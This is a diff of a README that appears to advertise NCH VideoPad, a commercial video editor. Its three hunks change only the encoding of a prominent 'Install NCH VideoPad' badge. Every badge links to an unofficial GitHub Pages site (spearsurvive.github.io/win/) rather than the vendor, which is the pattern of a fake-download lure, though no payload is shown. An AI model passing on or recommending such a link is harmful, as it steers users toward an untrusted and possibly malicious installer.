@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NCH VideoPad](https://img.shields.io/badge/⬇_Install_NCH%20VideoPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH VideoPad](https://img.shields.io/badge/⬇_Install_NCH+VideoPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NCH VideoPad is a video editing application from NCH Software offering multi-tra
 
 <div align="center">
 
-[![⬇ Install NCH VideoPad](https://img.shields.io/badge/⬇_Install_NCH%20VideoPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH VideoPad](https://img.shields.io/badge/⬇_Install_NCH+VideoPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NCH VideoPad is a video editing application from NCH Software offering multi-tra
 
 <div align="center">
 
-[![⬇ Install NCH VideoPad](https://img.shields.io/badge/⬇_Install_NCH%20VideoPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH VideoPad](https://img.shields.io/badge/⬇_Install_NCH+VideoPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
